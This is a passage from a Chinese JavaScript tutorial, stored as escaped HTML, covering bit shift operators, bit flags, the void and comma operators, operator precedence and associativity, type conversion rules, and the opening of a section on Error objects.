-8</code></pre><p>上面代码中，<code>-4</code>左移一位得到<code>-8</code>，是因为<code>-4</code>的二进制形式是<code>11111111111111111111111111111100</code>，左移一位后得到<code>11111111111111111111111111111000</code>，该数转为十进制（减去1后取反，再加上负号）即为<code>-8</code>。</p>\n<p>如果左移0位，就相当于将该数值转为32位整数，等同于取整，对于正数和负数都有效。</p>\n<pre class=\"prettyprint language-javascript\"><code>13.5 &lt;&lt; 0\n// 13\n\n-13.5 &lt;&lt; 0\n// -13</code></pre><p>左移运算符用于二进制数值非常方便。</p>\n<pre class=\"prettyprint language-javascript\"><code>var color = {r: 186, g: 218, b: 85};\n\n// RGB to HEX\n// (1 &lt;&lt; 24)的作用为保证结果是6位数\nvar rgb2hex = function(r, g, b) {\n  return &#039;#&#039; + ((1 &lt;&lt; 24) + (r &lt;&lt; 16) + (g &lt;&lt; 8) + b)\n    .toString(16) // 先转成十六进制，然后返回字符串\n    .substr(1);   // 去除字符串的最高位，返回后面六个字符串\n}\n\nrgb2hex(color.r, color.g, color.b)\n// &quot;#bada55&quot;</code></pre><p>上面代码使用左移运算符，将颜色的 RGB 值转为 HEX 值。</p>\n\n        <h2>\n            <a href='#右移运算符' class='header-anchor'>#</a>\n            <span>右移运算符</span>\n        </h2>\n    <p>右移运算符（<code>&gt;&gt;</code>）表示将一个数的二进制值向右移动指定的位数，头部补<code>0</code>，即除以<code>2</code>的指定次方（最高位即符号位不参与移动）。</p>\n<pre class=\"prettyprint language-javascript\"><code>4 &gt;&gt; 1\n// 2\n/*\n// 因为4的二进制形式为 00000000000000000000000000000100，\n// 右移一位得到 00000000000000000000000000000010，\n// 即为十进制的2\n*/\n\n-4 &gt;&gt; 1\n// -2\n/*\n// 因为-4的二进制形式为 11111111111111111111111111111100，\n// 右移一位，头部补1，得到 11111111111111111111111111111110,\n// 即为十进制的-2\n*/</code></pre><p>右移运算可以模拟 2 的整除运算。</p>\n<pre class=\"prettyprint language-javascript\"><code>5 &gt;&gt; 1\n// 2\n// 相当于 5 / 2 = 2\n\n21 &gt;&gt; 2\n// 5\n// 相当于 21 / 4 = 5\n\n21 &gt;&gt; 3\n// 2\n// 相当于 21 / 8 = 2\n\n21 &gt;&gt; 4\n// 1\n// 相当于 21 / 16 = 1</code></pre>\n        <h2>\n            <a href='#带符号位的右移运算符' class='header-anchor'>#</a>\n            <span>带符号位的右移运算符</span>\n        </h2>\n    <p>带符号位的右移运算符（<code>&gt;&gt;&gt;</code>）表示将一个数的二进制形式向右移动，包括符号位也参与移动，头部补<code>0</code>。所以，该运算总是得到正值。对于正数，该运算的结果与右移运算符（<code>&gt;&gt;</code>）完全一致，区别主要在于负数。</p>\n<pre class=\"prettyprint language-javascript\"><code>4 &gt;&gt;&gt; 1\n// 2\n\n-4 &gt;&gt;&gt; 1\n// 2147483646\n/*\n// 因为-4的二进制形式为11111111111111111111111111111100，\n// 带符号位的右移一位，得到01111111111111111111111111111110，\n// 即为十进制的2147483646。\n*/</code></pre><p>这个运算实际上将一个值转为32位无符号整数。</p>\n<p>查看一个负整数在计算机内部的储存形式，最快的方法就是使用这个运算符。</p>\n<pre class=\"prettyprint language-javascript\"><code>-1 &gt;&gt;&gt; 0 // 4294967295</code></pre><p>上面代码表示，<code>-1</code>作为32位整数时，内部的储存形式使用无符号整数格式解读，值为 4294967295（即<code>(2^32)-1</code>，等于<code>11111111111111111111111111111111</code>）。</p>\n\n        <h2>\n            <a href='#开关作用' class='header-anchor'>#</a>\n            <span>开关作用</span>\n        </h2>\n    <p>位运算符可以用作设置对象属性的开关。</p>\n<p>假定某个对象有四个开关，每个开关都是一个变量。那么，可以设置一个四位的二进制数，它的每个位对应一个开关。</p>\n<pre class=\"prettyprint language-javascript\"><code>var FLAG_A = 1; // 0001\nvar FLAG_B = 2; // 0010\nvar FLAG_C = 4; // 0100\nvar FLAG_D = 8; // 1000</code></pre><p>上面代码设置 A、B、C、D 四个开关，每个开关分别占有一个二进制位。</p>\n<p>然后，就可以用二进制与运算检验，当前设置是否打开了指定开关。</p>\n<pre class=\"prettyprint language-javascript\"><code>var flags = 5; // 二进制的0101\n\nif (flags &amp; FLAG_C) {\n  // ...\n}\n// 0101 &amp; 0100 =&gt; 0100 =&gt; true</code></pre><p>上面代码检验是否打开了开关<code>C</code>。如果打开，会返回<code>true</code>，否则返回<code>false</code>。</p>\n<p>现在假设需要打开<code>A</code>、<code>B</code>、<code>D</code>三个开关，我们可以构造一个掩码变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var mask = FLAG_A | FLAG_B | FLAG_D;\n// 0001 | 0010 | 1000 =&gt; 1011</code></pre><p>上面代码对<code>A</code>、<code>B</code>、<code>D</code>三个变量进行二进制或运算，得到掩码值为二进制的<code>1011</code>。</p>\n<p>有了掩码，二进制或运算可以确保打开指定的开关。</p>\n<pre class=\"prettyprint language-javascript\"><code>flags = flags | mask;</code></pre><p>二进制与运算可以将当前设置中凡是与开关设置不一样的项，全部关闭。</p>\n<pre class=\"prettyprint language-javascript\"><code>flags = flags &amp; mask;</code></pre><p>异或运算可以切换（toggle）当前设置，即第一次执行可以得到当前设置的相反值，再执行一次又得到原来的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>flags = flags ^ mask;</code></pre><p>二进制否运算可以翻转当前设置，即原设置为<code>0</code>，运算后变为<code>1</code>；原设置为<code>1</code>，运算后变为<code>0</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>flags = ~flags;</code></pre>\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Michal Budzynski, <a href=\"http://michalbe.blogspot.co.uk/2013/03/javascript-less-known-parts-bitwise.html\">JavaScript: The less known parts. Bitwise Operators</a></li>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2013/06/basic-javascript.html\">Basic JavaScript for the impatient programmer</a></li>\n<li>Mozilla Developer Network, <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Bitwise_Operators\">Bitwise Operators</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"运算符","link":"javascript:void(0)"},{"title":"其他运算符，运算顺序","link":"/operators/priority.html"}],"content":"\n        <h1>\n            <a href='#其他运算符，运算顺序' class='header-anchor'>#</a>\n            <span>其他运算符，运算顺序</span>\n        </h1>\n    \n        <h2>\n            <a href='#void-运算符' class='header-anchor'>#</a>\n            <span>void 运算符</span>\n        </h2>\n    <p><code>void</code>运算符的作用是执行一个表达式，然后不返回任何值，或者说返回<code>undefined</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>void 0 // undefined\nvoid(0) // undefined</code></pre><p>上面是<code>void</code>运算符的两种写法，都正确。建议采用后一种形式，即总是使用圆括号。因为<code>void</code>运算符的优先性很高，如果不使用括号，容易造成错误的结果。比如，<code>void 4 + 7</code>实际上等同于<code>(void 4) + 7</code>。</p>\n<p>下面是<code>void</code>运算符的一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 3;\nvoid (x = 5) //undefined\nx // 5</code></pre><p>这个运算符的主要用途是浏览器的书签工具（bookmarklet），以及在超级链接中插入代码防止网页跳转。</p>\n<p>请看下面的代码。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;script&gt;\nfunction f() {\n  console.log(&#039;Hello World&#039;);\n}\n&lt;/script&gt;\n&lt;a href=&quot;http://example.com&quot; onclick=&quot;f(); return false;&quot;&gt;点击&lt;/a&gt;</code></pre><p>上面代码中，点击链接后，会先执行<code>onclick</code>的代码，由于<code>onclick</code>返回<code>false</code>，所以浏览器不会跳转到 example.com。</p>\n<p><code>void</code>运算符可以取代上面的写法。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;a href=&quot;javascript: void(f())&quot;&gt;文字&lt;/a&gt;</code></pre><p>下面是一个更实际的例子，用户点击链接提交表单，但是不产生页面跳转。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;a href=&quot;javascript: void(document.form.submit())&quot;&gt;\n  提交\n&lt;/a&gt;</code></pre>\n        <h2>\n            <a href='#逗号运算符' class='header-anchor'>#</a>\n            <span>逗号运算符</span>\n        </h2>\n    <p>逗号运算符用于对两个表达式求值，并返回后一个表达式的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;a&#039;, &#039;b&#039; // &quot;b&quot;\n\nvar x = 0;\nvar y = (x++, 10);\nx // 1\ny // 10</code></pre><p>上面代码中，逗号运算符返回后一个表达式的值。</p>\n<p>逗号运算符的一个用途是，在返回一个值之前，进行一些辅助操作。</p>\n<pre class=\"prettyprint language-javascript\"><code>var value = (console.log(&#039;Hi!&#039;), true);\n// Hi!\n\nvalue // true</code></pre><p>上面代码中，先执行逗号之前的操作，然后返回逗号后面的值。</p>\n\n        <h2>\n            <a href='#运算顺序' class='header-anchor'>#</a>\n            <span>运算顺序</span>\n        </h2>\n    \n        <h3>\n            <a href='#优先级' class='header-anchor'>#</a>\n            <span>优先级</span>\n        </h3>\n    <p>JavaScript 各种运算符的优先级别（Operator Precedence）是不一样的。优先级高的运算符先执行，优先级低的运算符后执行。</p>\n<pre class=\"prettyprint language-javascript\"><code>4 + 5 * 6 // 34</code></pre><p>上面的代码中，乘法运算符（<code>*</code>）的优先性高于加法运算符（<code>+</code>），所以先执行乘法，再执行加法，相当于下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>4 + (5 * 6) // 34</code></pre><p>如果多个运算符混写在一起，常常会导致令人困惑的代码。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\nvar arr = [];\n\nvar y = arr.length &lt;= 0 || arr[0] === undefined ? x : arr[0];</code></pre><p>上面代码中，变量<code>y</code>的值就很难看出来，因为这个表达式涉及5个运算符，到底谁的优先级最高，实在不容易记住。</p>\n<p>根据语言规格，这五个运算符的优先级从高到低依次为：小于等于（<code>&lt;=</code>)、严格相等（<code>===</code>）、或（<code>||</code>）、三元（<code>?:</code>）、等号（<code>=</code>）。因此上面的表达式，实际的运算顺序如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>var y = ((arr.length &lt;= 0) || (arr[0] === undefined)) ? x : arr[0];</code></pre><p>记住所有运算符的优先级，是非常难的，也是没有必要的。</p>\n\n        <h3>\n            <a href='#圆括号的作用' class='header-anchor'>#</a>\n            <span>圆括号的作用</span>\n        </h3>\n    <p>圆括号（<code>()</code>）可以用来提高运算的优先级，因为它的优先级是最高的，即圆括号中的表达式会第一个运算。</p>\n<pre class=\"prettyprint language-javascript\"><code>(4 + 5) * 6 // 54</code></pre><p>上面代码中，由于使用了圆括号，加法会先于乘法执行。</p>\n<p>运算符的优先级别十分繁杂，且都是硬性规定，因此建议总是使用圆括号，保证运算顺序清晰可读，这对代码的维护和除错至关重要。</p>\n<p>顺便说一下，圆括号不是运算符，而是一种语法结构。它一共有两种用法：一种是把表达式放在圆括号之中，提升运算的优先级；另一种是跟在函数的后面，作用是调用函数。</p>\n<p>注意，因为圆括号不是运算符，所以不具有求值作用，只改变运算的优先级。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\n(x) = 2;</code></pre><p>上面代码的第二行，如果圆括号具有求值作用，那么就会变成<code>1 = 2</code>，这是会报错了。但是，上面的代码可以运行，这验证了圆括号只改变优先级，不会求值。</p>\n<p>这也意味着，如果整个表达式都放在圆括号之中，那么不会有任何效果。</p>\n<pre class=\"prettyprint language-javascript\"><code>(exprssion)\n// 等同于\nexpression</code></pre><p>函数放在圆括号中，会返回函数本身。如果圆括号紧跟在函数的后面，就表示调用函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {\n  return 1;\n}\n\n(f) // function f(){return 1;}\nf() // 1</code></pre><p>上面代码中，函数放在圆括号之中会返回函数本身，圆括号跟在函数后面则是调用函数。</p>\n<p>圆括号之中，只能放置表达式，如果将语句放在圆括号之中，就会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>(var a = 1)\n// SyntaxError: Unexpected token var</code></pre>\n        <h3>\n            <a href='#左结合与右结合' class='header-anchor'>#</a>\n            <span>左结合与右结合</span>\n        </h3>\n    <p>对于优先级别相同的运算符，大多数情况，计算顺序总是从左到右，这叫做运算符的“左结合”（left-to-right associativity），即从左边开始计算。</p>\n<pre class=\"prettyprint language-javascript\"><code>x + y + z</code></pre><p>上面代码先计算最左边的<code>x</code>与<code>y</code>的和，然后再计算与<code>z</code>的和。</p>\n<p>但是少数运算符的计算顺序是从右到左，即从右边开始计算，这叫做运算符的“右结合”（right-to-left associativity）。其中，最主要的是赋值运算符（<code>=</code>）和三元条件运算符（<code>?:</code>）。</p>\n<pre class=\"prettyprint language-javascript\"><code>w = x = y = z;\nq = a ? b : c ? d : e ? f : g;</code></pre><p>上面代码的运算结果，相当于下面的样子。</p>\n<pre class=\"prettyprint language-javascript\"><code>w = (x = (y = z));\nq = a ? b : (c ? d : (e ? f : g));</code></pre><p>上面的两行代码，各有三个等号运算符和三个三元运算符，都是先计算最右边的那个运算符。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"语法专题","link":"javascript:void(0)"},{"title":"数据类型的转换","link":"/features/conversion.html"}],"content":"\n        <h1>\n            <a href='#数据类型的转换' class='header-anchor'>#</a>\n            <span>数据类型的转换</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>JavaScript 是一种动态类型语言，变量没有类型限制，可以随时赋予任意值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = y ? 1 : &#039;a&#039;;</code></pre><p>上面代码中，变量<code>x</code>到底是数值还是字符串，取决于另一个变量<code>y</code>的值。<code>y</code>为<code>true</code>时，<code>x</code>是一个数值；<code>y</code>为<code>false</code>时，<code>x</code>是一个字符串。这意味着，<code>x</code>的类型没法在编译阶段就知道，必须等到运行时才能知道。</p>\n<p>虽然变量的数据类型是不确定的，但是各种运算符对数据类型是有要求的。如果运算符发现，运算子的类型与预期不符，就会自动转换类型。比如，减法运算符预期左右两侧的运算子应该是数值，如果不是，就会自动将它们转为数值。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;4&#039; - &#039;3&#039; // 1</code></pre><p>上面代码中，虽然是两个字符串相减，但是依然会得到结果数值<code>1</code>，原因就在于 JavaScript 将运算子自动转为了数值。</p>\n<p>本章讲解数据类型自动转换的规则。在此之前，先讲解如何手动强制转换数据类型。</p>\n\n        <h2>\n            <a href='#强制转换' class='header-anchor'>#</a>\n            <span>强制转换</span>\n        </h2>\n    <p>强制转换主要指使用<code>Number()</code>、<code>String()</code>和<code>Boolean()</code>三个函数，手动将各种类型的值，分别转换成数字、字符串或者布尔值。</p>\n\n        <h3>\n            <a href='#Number()' class='header-anchor'>#</a>\n            <span>Number()</span>\n        </h3>\n    <p>使用<code>Number</code>函数，可以将任意类型的值转化成数值。</p>\n<p>下面分成两种情况讨论，一种是参数是原始类型的值，另一种是参数是对象。</p>\n<p><strong>（1）原始类型值</strong></p>\n<p>原始类型值的转换规则如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 数值：转换后还是原来的值\nNumber(324) // 324\n\n// 字符串：如果可以被解析为数值，则转换为相应的数值\nNumber(&#039;324&#039;) // 324\n\n// 字符串：如果不可以被解析为数值，返回 NaN\nNumber(&#039;324abc&#039;) // NaN\n\n// 空字符串转为0\nNumber(&#039;&#039;) // 0\n\n// 布尔值：true 转成 1，false 转成 0\nNumber(true) // 1\nNumber(false) // 0\n\n// undefined：转成 NaN\nNumber(undefined) // NaN\n\n// null：转成0\nNumber(null) // 0</code></pre><p><code>Number</code>函数将字符串转为数值，要比<code>parseInt</code>函数严格很多。基本上，只要有一个字符无法转成数值，整个字符串就会被转为<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;42 cats&#039;) // 42\nNumber(&#039;42 cats&#039;) // NaN</code></pre><p>上面代码中，<code>parseInt</code>逐个解析字符，而<code>Number</code>函数整体转换字符串的类型。</p>\n<p>另外，<code>parseInt</code>和<code>Number</code>函数都会自动过滤一个字符串前导和后缀的空格。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;\\t\\v\\r12.34\\n&#039;) // 12\nNumber(&#039;\\t\\v\\r12.34\\n&#039;) // 12.34</code></pre><p><strong>（2）对象</strong></p>\n<p>简单的规则是，<code>Number</code>方法的参数是对象时，将返回<code>NaN</code>，除非是包含单个数值的数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number({a: 1}) // NaN\nNumber([1, 2, 3]) // NaN\nNumber([5]) // 5</code></pre><p>之所以会这样，是因为<code>Number</code>背后的转换规则比较复杂。</p>\n<p>第一步，调用对象自身的<code>valueOf</code>方法。如果返回原始类型的值，则直接对该值使用<code>Number</code>函数，不再进行后续步骤。</p>\n<p>第二步，如果<code>valueOf</code>方法返回的还是对象，则改为调用对象自身的<code>toString</code>方法。如果<code>toString</code>方法返回原始类型的值，则对该值使用<code>Number</code>函数，不再进行后续步骤。</p>\n<p>第三步，如果<code>toString</code>方法返回的是对象，就报错。</p>\n<p>请看下面的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {x: 1};\nNumber(obj) // NaN\n\n// 等同于\nif (typeof obj.valueOf() === &#039;object&#039;) {\n  Number(obj.toString());\n} else {\n  Number(obj.valueOf());\n}</code></pre><p>上面代码中，<code>Number</code>函数将<code>obj</code>对象转为数值。背后发生了一连串的操作，首先调用<code>obj.valueOf</code>方法, 结果返回对象本身；于是，继续调用<code>obj.toString</code>方法，这时返回字符串<code>[object Object]</code>，对这个字符串使用<code>Number</code>函数，得到<code>NaN</code>。</p>\n<p>默认情况下，对象的<code>valueOf</code>方法返回对象本身，所以一般总是会调用<code>toString</code>方法，而<code>toString</code>方法返回对象的类型字符串（比如<code>[object Object]</code>）。所以，会有下面的结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number({}) // NaN</code></pre><p>如果<code>toString</code>方法返回的不是原始类型的值，结果就会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  valueOf: function () {\n    return {};\n  },\n  toString: function () {\n    return {};\n  }\n};\n\nNumber(obj)\n// TypeError: Cannot convert object to primitive value</code></pre><p>上面代码的<code>valueOf</code>和<code>toString</code>方法，返回的都是对象，所以转成数值时会报错。</p>\n<p>从上例还可以看到，<code>valueOf</code>和<code>toString</code>方法，都是可以自定义的。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number({\n  valueOf: function () {\n    return 2;\n  }\n})\n// 2\n\nNumber({\n  toString: function () {\n    return 3;\n  }\n})\n// 3\n\nNumber({\n  valueOf: function () {\n    return 2;\n  },\n  toString: function () {\n    return 3;\n  }\n})\n// 2</code></pre><p>上面代码对三个对象使用<code>Number</code>函数。第一个对象返回<code>valueOf</code>方法的值，第二个对象返回<code>toString</code>方法的值，第三个对象表示<code>valueOf</code>方法先于<code>toString</code>方法执行。</p>\n\n        <h3>\n            <a href='#String()' class='header-anchor'>#</a>\n            <span>String()</span>\n        </h3>\n    <p><code>String</code>函数可以将任意类型的值转化成字符串，转换规则如下。</p>\n<p><strong>（1）原始类型值</strong></p>\n<ul>\n<li><strong>数值</strong>：转为相应的字符串。</li>\n<li><strong>字符串</strong>：转换后还是原来的值。</li>\n<li><strong>布尔值</strong>：<code>true</code>转为字符串<code>&quot;true&quot;</code>，<code>false</code>转为字符串<code>&quot;false&quot;</code>。</li>\n<li><strong>undefined</strong>：转为字符串<code>&quot;undefined&quot;</code>。</li>\n<li><strong>null</strong>：转为字符串<code>&quot;null&quot;</code>。</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>String(123) // &quot;123&quot;\nString(&#039;abc&#039;) // &quot;abc&quot;\nString(true) // &quot;true&quot;\nString(undefined) // &quot;undefined&quot;\nString(null) // &quot;null&quot;</code></pre><p><strong>（2）对象</strong></p>\n<p><code>String</code>方法的参数如果是对象，返回一个类型字符串；如果是数组，返回该数组的字符串形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>String({a: 1}) // &quot;[object Object]&quot;\nString([1, 2, 3]) // &quot;1,2,3&quot;</code></pre><p><code>String</code>方法背后的转换规则，与<code>Number</code>方法基本相同，只是互换了<code>valueOf</code>方法和<code>toString</code>方法的执行顺序。</p>\n<ol>\n<li><p>先调用对象自身的<code>toString</code>方法。如果返回原始类型的值，则对该值使用<code>String</code>函数，不再进行以下步骤。</p>\n</li>\n<li><p>如果<code>toString</code>方法返回的是对象，再调用原对象的<code>valueOf</code>方法。如果<code>valueOf</code>方法返回原始类型的值，则对该值使用<code>String</code>函数，不再进行以下步骤。</p>\n</li>\n<li><p>如果<code>valueOf</code>方法返回的是对象，就报错。</p>\n</li>\n</ol>\n<p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>String({a: 1})\n// &quot;[object Object]&quot;\n\n// 等同于\nString({a: 1}.toString())\n// &quot;[object Object]&quot;</code></pre><p>上面代码先调用对象的<code>toString</code>方法，发现返回的是字符串<code>[object Object]</code>，就不再调用<code>valueOf</code>方法了。</p>\n<p>如果<code>toString</code>法和<code>valueOf</code>方法，返回的都是对象，就会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  valueOf: function () {\n    return {};\n  },\n  toString: function () {\n    return {};\n  }\n};\n\nString(obj)\n// TypeError: Cannot convert object to primitive value</code></pre><p>下面是通过自定义<code>toString</code>方法，改变返回值的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>String({\n  toString: function () {\n    return 3;\n  }\n})\n// &quot;3&quot;\n\nString({\n  valueOf: function () {\n    return 2;\n  }\n})\n// &quot;[object Object]&quot;\n\nString({\n  valueOf: function () {\n    return 2;\n  },\n  toString: function () {\n    return 3;\n  }\n})\n// &quot;3&quot;</code></pre><p>上面代码对三个对象使用<code>String</code>函数。第一个对象返回<code>toString</code>方法的值（数值3），第二个对象返回的还是<code>toString</code>方法的值（<code>[object Object]</code>），第三个对象表示<code>toString</code>方法先于<code>valueOf</code>方法执行。</p>\n\n        <h3>\n            <a href='#Boolean()' class='header-anchor'>#</a>\n            <span>Boolean()</span>\n        </h3>\n    <p><code>Boolean</code>函数可以将任意类型的值转为布尔值。</p>\n<p>它的转换规则相对简单：除了以下五个值的转换结果为<code>false</code>，其他的值全部为<code>true</code>。</p>\n<ul>\n<li><code>undefined</code></li>\n<li><code>null</code></li>\n<li><code>-0</code>或<code>+0</code></li>\n<li><code>NaN</code></li>\n<li><code>&#39;&#39;</code>（空字符串）</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>Boolean(undefined) // false\nBoolean(null) // false\nBoolean(0) // false\nBoolean(NaN) // false\nBoolean(&#039;&#039;) // false</code></pre><p>注意，所有对象（包括空对象）的转换结果都是<code>true</code>，甚至连<code>false</code>对应的布尔对象<code>new Boolean(false)</code>也是<code>true</code>（详见《原始类型值的包装对象》一章）。</p>\n<pre class=\"prettyprint language-javascript\"><code>Boolean({}) // true\nBoolean([]) // true\nBoolean(new Boolean(false)) // true</code></pre><p>所有对象的布尔值都是<code>true</code>，这是因为 JavaScript 语言设计的时候，出于性能的考虑，如果对象需要计算才能得到布尔值，对于<code>obj1 &amp;&amp; obj2</code>这样的场景，可能会需要较多的计算。为了保证性能，就统一规定，对象的布尔值为<code>true</code>。</p>\n\n        <h2>\n            <a href='#自动转换' class='header-anchor'>#</a>\n            <span>自动转换</span>\n        </h2>\n    <p>下面介绍自动转换，它是以强制转换为基础的。</p>\n<p>遇到以下三种情况时，JavaScript 会自动转换数据类型，即转换是自动完成的，用户不可见。</p>\n<p>第一种情况，不同类型的数据互相运算。</p>\n<pre class=\"prettyprint language-javascript\"><code>123 + &#039;abc&#039; // &quot;123abc&quot;</code></pre><p>第二种情况，对非布尔值类型的数据求布尔值。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (&#039;abc&#039;) {\n  console.log(&#039;hello&#039;)\n}  // &quot;hello&quot;</code></pre><p>第三种情况，对非数值类型的值使用一元运算符（即<code>+</code>和<code>-</code>）。</p>\n<pre class=\"prettyprint language-javascript\"><code>+ {foo: &#039;bar&#039;} // NaN\n- [1, 2, 3] // NaN</code></pre><p>自动转换的规则是这样的：预期什么类型的值，就调用该类型的转换函数。比如，某个位置预期为字符串，就调用<code>String</code>函数进行转换。如果该位置即可以是字符串，也可能是数值，那么默认转为数值。</p>\n<p>由于自动转换具有不确定性，而且不易除错，建议在预期为布尔值、数值、字符串的地方，全部使用<code>Boolean</code>、<code>Number</code>和<code>String</code>函数进行显式转换。</p>\n\n        <h3>\n            <a href='#自动转换为布尔值' class='header-anchor'>#</a>\n            <span>自动转换为布尔值</span>\n        </h3>\n    <p>JavaScript 遇到预期为布尔值的地方（比如<code>if</code>语句的条件部分），就会将非布尔值的参数自动转换为布尔值。系统内部会自动调用<code>Boolean</code>函数。</p>\n<p>因此除了以下五个值，其他都是自动转为<code>true</code>。</p>\n<ul>\n<li><code>undefined</code></li>\n<li><code>null</code></li>\n<li><code>+0</code>或<code>-0</code></li>\n<li><code>NaN</code></li>\n<li><code>&#39;&#39;</code>（空字符串）</li>\n</ul>\n<p>下面这个例子中，条件部分的每个值都相当于<code>false</code>，使用否定运算符后，就变成了<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>if ( !undefined\n  &amp;&amp; !null\n  &amp;&amp; !0\n  &amp;&amp; !NaN\n  &amp;&amp; !&#039;&#039;\n) {\n  console.log(&#039;true&#039;);\n} // true</code></pre><p>下面两种写法，有时也用于将一个表达式转为布尔值。它们内部调用的也是<code>Boolean</code>函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 写法一\nexpression ? true : false\n\n// 写法二\n!! expression</code></pre>\n        <h3>\n            <a href='#自动转换为字符串' class='header-anchor'>#</a>\n            <span>自动转换为字符串</span>\n        </h3>\n    <p>JavaScript 遇到预期为字符串的地方，就会将非字符串的值自动转为字符串。具体规则是，先将复合类型的值转为原始类型的值，再将原始类型的值转为字符串。</p>\n<p>字符串的自动转换，主要发生在字符串的加法运算时。当一个值为字符串，另一个值为非字符串，则后者转为字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;5&#039; + 1 // &#039;51&#039;\n&#039;5&#039; + true // &quot;5true&quot;\n&#039;5&#039; + false // &quot;5false&quot;\n&#039;5&#039; + {} // &quot;5[object Object]&quot;\n&#039;5&#039; + [] // &quot;5&quot;\n&#039;5&#039; + function (){} // &quot;5function (){}&quot;\n&#039;5&#039; + undefined // &quot;5undefined&quot;\n&#039;5&#039; + null // &quot;5null&quot;</code></pre><p>这种自动转换很容易出错。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  width: &#039;100&#039;\n};\n\nobj.width + 20 // &quot;10020&quot;</code></pre><p>上面代码中，开发者可能期望返回<code>120</code>，但是由于自动转换，实际上返回了一个字符<code>10020</code>。</p>\n\n        <h3>\n            <a href='#自动转换为数值' class='header-anchor'>#</a>\n            <span>自动转换为数值</span>\n        </h3>\n    <p>JavaScript 遇到预期为数值的地方，就会将参数值自动转换为数值。系统内部会自动调用<code>Number</code>函数。</p>\n<p>除了加法运算符（<code>+</code>）有可能把运算子转为字符串，其他运算符都会把运算子自动转成数值。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;5&#039; - &#039;2&#039; // 3\n&#039;5&#039; * &#039;2&#039; // 10\ntrue - 1  // 0\nfalse - 1 // -1\n&#039;1&#039; - 1   // 0\n&#039;5&#039; * []    // 0\nfalse / &#039;5&#039; // 0\n&#039;abc&#039; - 1   // NaN\nnull + 1 // 1\nundefined + 1 // NaN</code></pre><p>上面代码中，运算符两侧的运算子，都被转成了数值。</p>\n<blockquote>\n<p>注意：<code>null</code>转为数值时为<code>0</code>，而<code>undefined</code>转为数值时为<code>NaN</code>。</p>\n</blockquote>\n<p>一元运算符也会把运算子转成数值。</p>\n<pre class=\"prettyprint language-javascript\"><code>+&#039;abc&#039; // NaN\n-&#039;abc&#039; // NaN\n+true // 1\n-false // 0</code></pre>\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2012/01/object-plus-object.html\">What is {} + {} in JavaScript?</a></li>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2013/04/quirk-implicit-conversion.html\">JavaScript quirk 1: implicit conversion of values</a></li>\n<li>Benjie Gillam, <a href=\"http://www.benjiegillam.com/2013/06/quantum-javascript/\">Quantum JavaScript?</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"语法专题","link":"javascript:void(0)"},{"title":"错误处理机制","link":"/features/error.html"}],"content":"\n        <h1>\n            <a href='#错误处理机制' class='header-anchor'>#</a>\n            <span>错误处理机制</span>\n        </h1>\n    \n        <h2>\n            <a href='#Error-实例对象' class='header-anchor'>#</a>\n            <span>Error 实例对象</span>\n        </h2>\n    <p>JavaScript 解析或运行时，一旦发生错误，引擎就会抛出一个错误对象。JavaScript 原生提供<code>Error</code>构造函数，所有抛出的错误都是这个构造函数的实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>var err = new Error(&#039;出错了&#039;);\nerr.message // &quot;出错了&quot;</code></pre><p>上面代码中，我们调用<code>Error</code>构造函数，生成一个实例对象<code>err</code>。<code>Error</code>构造函数接受一个参数，表示错误提示，可以从实例的<code>message</code>属性读到这个参数。抛出<code>Error</code>实例对象以后，整个程序就中断在发生错误的地方，不再往下执行。</p>\n<p>JavaScript 语言标准只提到，<code>Error</code>实例对象必须有<code>message</code>属性，表示出错时的提示信息，没有提到其他属性。大多数 JavaScript 